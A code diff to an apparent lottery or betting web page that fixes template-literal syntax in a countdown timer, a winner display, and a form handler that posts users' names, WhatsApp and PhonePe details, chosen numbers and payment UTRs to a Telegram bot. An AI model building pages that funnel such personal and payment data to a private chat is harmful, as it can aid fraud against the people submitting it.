@@ -271,12 +271,12 @@
       const timerDisplay = document.getElementById("timer");
       const minutes = String(Math.floor(timeInSeconds / 60)).padStart(2, '0');
       const seconds = String(timeInSeconds % 60).padStart(2, '0');
-      timerDisplay.textContent = 🕒 Time Left: 00:${minutes}:${seconds};
+      timerDisplay.textContent = `🕒 Time Left: ${minutes}:${seconds}`;
 
       if (timeInSeconds === 0) {
         clearInterval(timerInterval);
         document.getElementById("winningNumber").textContent = winningNumberValue;
-        document.getElementById("winnerName").textContent = 🏆 Winner: ${winnerNameValue};
+        document.getElementById("winnerName").textContent = `🏆 Winner: ${winnerNameValue}`;
         document.getElementById("winnerName").style.display = "block";
       } else {
         timeInSeconds--;
@@ -352,9 +352,9 @@
         return;
       }
 
-      const message = 📝 New Form Submission:\n👤 Name: ${name}\n📱 WhatsApp: ${whatsapp}\n💸 PhonePe: ${phonepe}\n🎯 Selected Number: ${selected}\n🔢 UTR: ${utr};
+      const message = `📝 New Form Submission:\n👤 Name: ${name}\n📱 WhatsApp: ${whatsapp}\n💸 PhonePe: ${phonepe}\n🎯 Selected Number: ${selected}\n🔢 UTR: ${utr}`;
 
-      fetch(https://api.telegram.org/bot${telegramToken}/sendMessage, {
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: telegramChatId, text: message })
